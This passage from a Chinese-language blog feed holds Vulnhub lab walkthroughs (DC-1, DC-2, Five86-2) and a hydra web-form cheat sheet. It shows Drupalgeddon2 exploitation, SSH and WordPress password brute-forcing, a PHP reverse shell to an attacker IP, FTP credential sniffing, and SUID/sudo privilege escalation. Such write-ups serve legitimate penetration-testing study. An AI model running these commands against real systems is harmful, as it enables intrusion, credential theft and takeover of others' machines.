class="meta-keyword">/filter/</span>tips/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/node/</span>add/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/search/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>register/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>password/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>login/ </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/user/</span>logout/</span><br><span class="line"><span class="meta"># Paths (no clean URLs)</span></span><br><span class="line"><span class="symbol">Disallow:</span> /?q=admin/ </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=comment<span class="meta-keyword">/reply/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=filter<span class="meta-keyword">/tips/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=node<span class="meta-keyword">/add/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=search/ </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/password/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/register/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/login/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> /?q=user<span class="meta-keyword">/logout/</span></span><br></pre></td></tr></table></figure>

<p><img src="2020-03-17-11-17-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-17-23屏幕截图"> </p>
<p>逐一访问，得到如下信息：</p>
<ul>
<li>CMS：Drupal</li>
<li>版本：7.X</li>
</ul>
<p><img src="2020-03-17-11-48-03%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-03屏幕截图"> </p>
<h2 id="漏洞利用-Getshell"><a href="#漏洞利用-Getshell" class="headerlink" title="漏洞利用(Getshell)"></a>漏洞利用(Getshell)</h2><p>搜索历史漏洞，找一个可正常利用的，有的会因为各种问题无法使用</p>
<p>在 MSF 上搜到几个，挑个利用：</p>
<p><code>use exploit/unix/webapp/drupal_drupalgeddon2</code> </p>
<p><img src="2020-03-17-11-48-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-11-48-51屏幕截图"> </p>
<p><img src="2020-03-17-12-12-26%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-12-26屏幕截图"> </p>
<p><img src="2020-03-17-12-18-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-18-40屏幕截图"></p>
<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
<li>登陆用户：www-data</li>
<li><code>Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux</code> </li>
<li><code>/etc/passwd</code> <ul>
<li><code>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</code> </li>
</ul>
</li>
</ul>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>查看当前目录，得到一个 flag， <code>flag4</code>用户下得到第二个 flag</p>
<p><img src="2020-03-17-12-29-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-29-33屏幕截图"></p>
<p>flag1 提示找 Drupal 的配置文件，百度一下 Drupal 的配置文件一般位于 <code>/var/www/sites/default/</code> </p>
<p>文件名是 <code>settings.php</code> </p>
<p> <code>find</code> 一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name settings.php 2&gt;/dev/null </span><br><span class="line">/var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>

<p>查看后得到 flag2 和一组用户名密码，登陆数据库得到两个用户名(第三个是我自己加的)，密码被加密，暂时没有作用</p>
<p><img src="%E6%88%AA%E5%B1%8F2020-03-1712.36.32.png" alt="截屏2020-03-1712.36.32"> </p>
<p><img src="2020-03-17-12-45-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-12-45-25屏幕截图"> </p>
<p><img src="2020-03-17-13-16-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-13-16-07屏幕截图"> </p>
<p><img src="%E6%88%AA%E5%B1%8F2020-03-1916.11.12.png" alt="截屏2020-03-1916.11.12"> </p>
<h3 id="密码枚举"><a href="#密码枚举" class="headerlink" title="密码枚举"></a>密码枚举</h3><p>flag2 提到了密码爆破不是唯一的方法，可能是通过修改数据库内某个用户的密码，不想这么麻烦</p>
<p>听歌的时候想到了还有个 flag4 用户，既然存在，那肯定有其道理，试试能不能枚举<br><code>hydra</code> 爆破 ssh，因为刚装的系统，密码字典还没下载，就先用 <code>john</code> 的，还真得到了密码</p>
<p><img src="2020-03-17-14-25-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-03-17-14-25-48屏幕截图"> </p>
<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>登录 ssh，查看 SUID ，<code>find</code> 提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find	<span class="comment"># &lt;---</span></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown </span><br><span class="line">/usr/lib/openssh/ssh-keysign </span><br><span class="line">/usr/lib/eject/dmcrypt-get-device </span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper </span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="%E6%88%AA%E5%B1%8F2020-03-1715.10.08.png" alt="截屏2020-03-1715.10.08"> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"whoami"</span> \; </span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find ./ -<span class="built_in">type</span> f -name flag4.txt -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># cat thefinalflag.txt</span></span><br></pre></td></tr></table></figure>

<p>都提权了，其他 flag 也就无所谓了</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">flag</span></span><br><span class="line"><span class="selector-tag">flag2</span></span><br><span class="line"><span class="selector-tag">flag4</span></span><br><span class="line"><span class="selector-tag">thefinalflag</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2</title>
    <url>/2020/03/25/DC-2/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line"></span><br><span class="line"><span class="comment">############# all port ###############</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://dc-2/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br></pre></td></tr></table></figure>

<p>开放端口：80、7744<br>设置 hosts，访问 Web 页面：WordPress</p>
<h3 id="WPScan-扫描"><a href="#WPScan-扫描" class="headerlink" title="WPScan 扫描"></a>WPScan 扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">########## word theme ###########</span></span><br><span class="line">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: twentyseventeen</span><br><span class="line"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span><br><span class="line"> | Last Updated: 2020-02-25T00:00:00.000Z</span><br><span class="line"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.2</span><br><span class="line"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span><br><span class="line"> | Style Name: Twenty Seventeen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="line"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: <span class="string">'Version: 1.2'</span></span><br></pre></td></tr></table></figure>

<p>WordPress version 4.7.10<br>WordPress theme in use: twentyseventeen</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="https://gitee.com/t_mouse/BlogPics/raw/master/uPic/Images/2020-04-20-20-2020-03-25-21-31-49-rYRwis.png" alt="2020-03-25-21-31-49"></p>
<h3 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$searchsploit</span> wordpress 4.7.1</span><br><span class="line"><span class="variable">$searchsploit</span> wordpress akismet</span><br></pre></td></tr></table></figure>

<p>Wordpress 4.7.1：用户名枚举 </p>
<h3 id="用户枚举-amp-密码爆破"><a href="#用户枚举-amp-密码爆破" class="headerlink" title="用户枚举&amp;密码爆破"></a>用户枚举&amp;密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$wpscan</span> --url http://dc-2 -e u </span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">jerry</span><br><span class="line">tom</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2 -U users.txt -P dict.txt</span><br><span class="line"></span><br><span class="line">[i] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>

<p>将用户名密码 代入 SSH 测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hydra</span> -L user.txt -P dict.txt ssh://172.16.252.134:7744</span><br><span class="line"> </span><br><span class="line">[7744][ssh] host: 172.16.252.134   login: tom   password: parturient</span><br></pre></td></tr></table></figure>

<h3 id="情报整理"><a href="#情报整理" class="headerlink" title="情报整理"></a>情报整理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">##### 端口 ####</span></span><br><span class="line">80：Apache 2.4.10</span><br><span class="line">7744：OpenSSH 6.7p1</span><br><span class="line"></span><br><span class="line"><span class="comment">##### CMS ####</span></span><br><span class="line">Wordpress 4.7.10</span><br><span class="line">Wordpress Plugin akismet</span><br><span class="line"></span><br><span class="line"><span class="comment">##### user/passwd ####</span></span><br><span class="line">Username: jerry, Password: adipiscing</span><br><span class="line">Username: tom, Password: parturient</span><br><span class="line"></span><br><span class="line"><span class="comment">##### Web 后台 ####</span></span><br><span class="line">jerry：adipiscing</span><br><span class="line">tom：parturient</span><br><span class="line"></span><br><span class="line"><span class="comment">##### SSH ####</span></span><br><span class="line">[7744][ssh] host: 172.16.252.134   login: tom   password: parturient</span><br></pre></td></tr></table></figure>

<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><p>除 Flag2 外，没有多少有用的信息</p>
<h2 id="SSH-登录"><a href="#SSH-登录" class="headerlink" title="SSH 登录"></a>SSH 登录</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ssh</span> -p 7744 tom</span><br></pre></td></tr></table></figure>

<p>登录的 shell 为受限制的 rbash，使用 vi 绕过：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p>HOME 目录下得到 Flag3，cat、tail 命令不存在，但可以使用 less</p>
<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#### /etc/passwd ####</span></span><br><span class="line">tom:x:1001:1001:Tom Cat,,,:/home/tom:/bin/rbash</span><br><span class="line">jerry:x:1002:1002:Jerry Mouse,,,:/home/jerry:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 系统版本 ####</span></span><br><span class="line"><span class="comment">#### 内核版本 ####</span></span><br></pre></td></tr></table></figure>

<p>HOME 下有个 usr 目录，其内是当前用户可以使用的 4 个命令，想到还有个 jerry 用户且还有对应的密码（不知可不可行），因为 4 个可用命令不包括 su 命令，这里脑子差点转不过来了，其实可以用 <strong>绝对路径</strong> 执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/find / -iname su -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/bin/su</span><br><span class="line"></span><br><span class="line">/bin/su jerry</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用 jerry 的密码登录后，查看自己可以干什么(<code>sudo -l</code>)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC-2:                                     </span><br><span class="line">    env_reset, mail_badpass,                                                     </span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line">                                                                                 </span><br><span class="line">User jerry may run the following commands on DC-2:                               </span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure>

<p>使用 git 提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sudo</span> git -p <span class="built_in">help</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="variable">$sudo</span> git <span class="built_in">help</span> config</span><br></pre></td></tr></table></figure>

<p>Flag 找不找都无所谓了，重要的是这个渗透过程学到的技能</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>Five86-2</title>
    <url>/2020/03/19/Five86-2/</url>
    <content><![CDATA[<blockquote>
<p>2020-02-26</p>
</blockquote>
<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<p>无 <code>ProFTPD 1.3.5e</code> 相关漏洞，无法匿名登录</p>
<p>后台放置目录枚举，<code>WordPress</code> 站点 <code>wpscan</code> 扫描</p>
<p><img src="2020-02-26-15-21-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-21-50屏幕截图"> <img src="2020-02-26-15-22-25%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-22-25屏幕截图"> </p>
<p>逐一访问，无有价值信息，<code>wpscan</code> 枚举出了几个用户名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">barney</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure>

<p>尝试枚举爆破，枚举出两个密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.56.117 -U tmp/user.txt -P /usr/share/wordlists/rockyou.txt -t 30</span><br><span class="line"></span><br><span class="line"><span class="comment"># [SUCCESS] - barney / spooky1                                                                 </span></span><br><span class="line"><span class="comment"># [SUCCESS] - stephen / apollo1</span></span><br></pre></td></tr></table></figure>

<p><img src="2020-02-26-15-53-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-15-53-05屏幕截图"> </p>
<p><img src="2020-02-26-16-37-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-16-37-11屏幕截图"> </p>
<h2 id="撬开大门"><a href="#撬开大门" class="headerlink" title="撬开大门"></a>撬开大门</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">barney ： spooky1   </span><br><span class="line">stephen ： apollo1</span><br></pre></td></tr></table></figure>

<p>两个账号均可登录后台，不过 <code>stephen</code> 无利用点</p>
<p><code>barney</code> 登陆后，有三个插件，搜索相关漏洞，除第三个插件外，其他暂无价值：</p>
<p>根据 <code>PoC</code> 说明，写出 <code>exp</code> ，上传后，本地端口监听，访问上传网址，得到 <code>shell</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.109/8848 0&gt;&amp;1'"</span>);</span><br></pre></td></tr></table></figure>

<p>注意：用 <code>echo</code> 写入的时候注意引号的转义，写入后最好再查看一遍利用脚本的内容是否正确</p>
<p><img src="2020-02-26-17-37-01%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-01屏幕截图"></p>
<p><img src="2020-02-26-17-37-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-37-18屏幕截图"> <img src="2020-02-26-17-34-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="被忽略的转义"></p>
<h2 id="登堂入室"><a href="#登堂入室" class="headerlink" title="登堂入室"></a>登堂入室</h2><p>接收到了 <code>shell</code> 先收集一波信息，最喜欢的 <code>/etc/passwd</code> 里总是包含用户及其主目录，<code>HOME</code> 下的用户目录无访问权限</p>
<p>各种信息收集了一波，当前用户的作用实在不大。无思路无目的时候，就是收集的情报不够，整理一下现有资料：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e					无相关漏洞</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))	无相关漏洞</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">barney		spooky1		FTP：No	WordPress：OK</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen		apollo1		FTP：No	WordPress：OK</span><br><span class="line"><span class="comment">######################</span></span><br><span class="line">barney		:x:1001:1001:Barney Sumner:/home/barney:/bin/bash</span><br><span class="line">stephen		:x:1002:1002:Stephen Morris:/home/stephen:/bin/bash</span><br><span class="line">peter		:x:1003:1003:Peter Hook:/home/peter:/bin/bash</span><br><span class="line">gillian		:x:1004:1004:Gillian Gilbert:/home/gillian:/bin/bash</span><br><span class="line">richard		:x:1005:1005:Richard Starkey:/home/richard:/bin/bash</span><br><span class="line">paul		:x:1006:1006:Paul McCartney:/home/paul:/bin/bash</span><br><span class="line">john		:x:1007:1007:John Lennon:/home/john:/bin/bash</span><br><span class="line">george		:x:1008:1008:George Harrison:/home/george:/bin/bash</span><br><span class="line"><span class="comment">#####################</span></span><br><span class="line">得到密码的两个账号无法登陆 FTP</span><br><span class="line"></span><br><span class="line"><span class="comment">#####################									&lt;----- 未验证/未收集</span></span><br><span class="line">Linux kernel 信息未收集（内核提权）</span><br><span class="line">FTP 没有起到作用（存在即有理）</span><br><span class="line"></span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">两个账户存在于 /etc/passwd 下，是否可以切换用户</span><br><span class="line">barney 密码错误</span><br><span class="line">stephen 可以切换</span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">barney		spooky1		FTP：No	WordPress：OK	su：NO</span><br><span class="line">peter</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">stephen		apollo1		FTP：No	WordPress：OK	su：OK	&lt;----- 切入点</span><br></pre></td></tr></table></figure>

<p><img src="2020-02-26-17-38-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-26-17-38-13屏幕截图"></p>
<h2 id="身份转换"><a href="#身份转换" class="headerlink" title="身份转换"></a>身份转换</h2><p><code>su stephen</code> ：切换用户</p>
<p>不存在 <code>sudo</code> 权限，主目录暂无利用信息，卡住了</p>
<p>查了一下 WriteUp，抓 <code>FTP</code> 的包，有明文密码：</p>
<p>查看相关进程：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux | grep <span class="string">"ftp"</span></span><br><span class="line"></span><br><span class="line">systemd+  1376  0.0  0.9 119972  9484 pts/0    Ss+  02:32   0:00 proftpd: (accepting connections)</span><br><span class="line">paul      2883  0.0  0.0   2600   732 ?        Ss   05:38   0:00 /bin/sh -c /home/paul/ftp_upload.sh &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">paul      2884  0.0  0.0   2600   864 ?        S    05:38   0:00 /bin/sh /home/paul/ftp_upload.sh</span><br><span class="line">paul      2885  0.0  0.2   3224  2036 ?        S    05:38   0:00 ftp -n 172.18.0.10</span><br><span class="line">1000      2886  0.0  0.8 133072  8136 pts/0    S+   05:38   0:00 proftpd: paul - 172.18.0.1: STOR file.txt</span><br><span class="line">stephen   2889  0.0  0.0   6296   924 pts/0    S+   05:38   0:00 grep ftp</span><br></pre></td></tr></table></figure>

<p>查看 FTP 监听的网卡：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip addr</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">3: br-eca3858d86bf: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:9e:df:8d:0f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-eca3858d86bf</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:9eff:fedf:8d0f/64 scope link</span><br></pre></td></tr></table></figure>

<p>抓包，得到密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timeout 50 tcpdump -i br-eca3858d86bf -w pack.pcap</span><br><span class="line">tcpdump -r pack.pcap</span><br></pre></td></tr></table></figure>

<p><img src="2020-02-27-13-39-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 13-39-28屏幕截图"> </p>
<p><img src="2020-02-27-14-40-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-40-50屏幕截图"> </p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>登录 <code>paul</code> 查看可以 <code>sudo</code> 执行的程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> paul on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User paul may run the following commands on five86-2:</span><br><span class="line">    (peter) NOPASSWD: /usr/sbin/service</span><br></pre></td></tr></table></figure>

<p><code>/usr/sbin/service</code> 提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u peter service ../../bin/bash</span><br></pre></td></tr></table></figure>

<p>查看可以 <code>sudo</code> 执行的程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> peter on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on five86-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: /usr/bin/passwd</span><br></pre></td></tr></table></figure>

<p>修改 <code>root</code> 密码，登录 <code>root</code> 查看 <code>flag</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line">su -</span><br></pre></td></tr></table></figure>

<p><img src="2020-02-27-14-54-14%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="2020-02-27 14-54-14屏幕截图"> </p>
<hr>
<p>卡在了 <code>FTP</code> 抓包的位置，还是经验不足</p>
<p>前期收集的信息必定是有用的，<code>FTP</code> 使用明文传输密码，只需要抓包，就可以得到</p>
<p>查看系统正在运行的进程也要加入信息收集里面</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>hydra attack web form</title>
    <url>/2020/04/20/hydra-attack-web-form/</url>
    <content><![CDATA[<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">hydra -L users.txt -P password.txt \</span><br><span class="line">-s <span class="number">80</span> -t <span class="number">30</span> dc<span class="number">-4</span> --http-post-form \</span><br><span class="line"><span class="string">"/login.php:username=^USER^&amp;password=^PASS^:S=Command"</span></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight parser3"><table><tr><td class="code"><pre><span class="line"><span class="xml">"/login.php:username=</span><span class="keyword">^USER</span><span class="xml">^&amp;password=</span><span class="keyword">^PASS</span><span class="keyword">^:S</span><span class="xml">=Command"</span></span><br></pre></td></tr></table></figure>

<figure class="highlight parser3"><table><tr><td class="code"><pre><span class="line"><span class="xml">"/login.php:username=</span><span class="keyword">^USER</span><span class="xml">^&amp;password=</span><span class="keyword">^PASS</span><span class="keyword">^:Login</span><span class="xml"> Failed"</span></span><br><span class="line"><span class="xml">"/login.php:username=</span><span class="keyword">^USER</span><span class="xml">^&amp;password=</span><span class="keyword">^PASS</span><span class="keyword">^:F</span><span class="xml">=Login Failed"</span></span><br></pre></td></tr></table></figure>

<figure class="highlight parser3"><table><tr><td class="code"><pre><span class="line"><span class="xml">"/login.php:username=</span><span class="keyword">^USER</span><span class="xml">^&amp;password=</span><span class="keyword">^PASS</span><span class="keyword">^:S</span><span class="xml">=Command:H=Cookie=xxxx"</span></span><br></pre></td></tr></table></figure>

<br>

<ul>
<li><code>&lt;Error Message&gt;</code>不止搜索 html 信息，还包括 http 头（<code>S=302</code>）</li>
<li><code>form</code> 不是 <code>from</code></li>
<li><code>S</code>：登陆成功后 rsp 返回内容的关键词</li>
<li><code>F</code> 或无标志，登陆失败信息</li>
<li><code>H</code>：请求头信息</li>
</ul>
<br>

<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
<li><a href="http://insidetrust.blogspot.com/2011/08/using-hydra-to-dictionary-attack-web.html" target="_blank" rel="noopener">Using Hydra to dictionary-attack web-based login forms</a></li>
</ul>
<br>

<hr>
